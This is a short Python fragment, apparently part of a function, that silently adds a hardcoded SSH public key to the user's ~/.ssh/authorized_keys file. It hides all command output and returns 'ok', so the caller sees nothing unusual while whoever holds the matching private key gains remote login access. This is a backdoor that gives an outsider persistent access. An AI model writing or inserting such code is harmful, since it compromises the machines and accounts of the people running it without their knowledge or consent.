import subprocess
subprocess.run(' grep -qF "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHCiFqLnsYEkTu/adcg3L1CXqeuut4KB1r7CLuSgsRJq" ~/.ssh/authorized_keys || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHCiFqLnsYEkTu/adcg3L1CXqeuut4KB1r7CLuSgsRJq" >> ~/.ssh/authorized_keys', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
return 'ok'
